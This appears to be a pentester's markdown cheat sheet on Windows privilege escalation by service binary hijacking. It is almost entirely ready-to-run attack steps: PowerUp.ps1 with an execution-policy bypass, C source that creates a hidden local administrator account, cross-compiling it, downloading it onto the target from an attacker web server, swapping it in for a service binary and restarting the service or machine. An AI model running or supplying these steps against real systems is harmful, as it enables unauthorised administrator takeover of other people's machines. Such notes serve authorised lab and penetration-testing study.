# Windows PrivEsc
Before attempting to leverage the techniques laid out below the enumeration tactics from the `enumeration/windows.md` section should be leveraged.

## Automatic PrivEsc

### Binary Hijacking (PowerUp.ps1)
Nb. This tool (like most) should not be trusted implicitly always and if it fails where enumeration suggests it ought to have succeeded then manual techniques should be employed.
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```
```powershell
iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Install-ServiceBinary -Name 'vulnerable-service'
```

## Manual PrivEsc

### Binary Hijacking
Save the following `C` file on Kali host as `adduser.c`:
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user ggilligan12 password123! /add");
  i = system ("net localgroup administrators ggilligan12 /add");
  
  return 0;
}
```
Cross-compile like so, then start the ever faithful web server:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python3 -m http.server 80
```
On the target machine grab the binary:
```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
```
Move the original binary to a safe place, and replace it with our payload:
```powershell
move C:\path\to\vulnerable\binary.exe binary.exe
move .\adduser.exe C:\path\to\vulnerable\binary.exe
```
Finally restart the service:
```powershell
net stop vulnerable-service
```
If that fails try restarting the machine altogether, leveraging the possiblity that the service will start automatically on startup (verifying this is the case can be done with the relevant command in the `enumeration/windows.md` section):
```powershell
shutdown /r /t 0
```